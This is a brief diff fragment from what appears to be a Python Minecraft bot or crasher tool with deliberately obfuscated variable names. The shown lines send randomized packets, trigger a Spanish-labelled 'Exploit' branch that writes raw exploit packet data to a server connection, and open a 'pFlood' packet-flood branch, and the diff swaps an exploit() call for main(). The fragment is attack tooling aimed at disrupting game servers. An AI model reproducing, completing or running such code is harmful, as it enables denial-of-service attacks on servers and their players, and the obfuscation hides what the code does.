@@ -280,7 +280,7 @@ class CraftPlayer :
                     OO0OOOO0O00O0OO00 .SendPacket ('k\xff\xff'+struct .pack ('>h',random .choice (ids ))+'@\x00\x00')
                 if OOO0000OO0O0000OO =='tO':
                     syncprint ('Exploit - Empezando..')
-                    exploit()
+                    main()
                     connection.write_raw(exploit_packet_data)
                 if OOO0000OO0O0000OO =='pFlood':
                     OOO0000OO0O0000OO =0
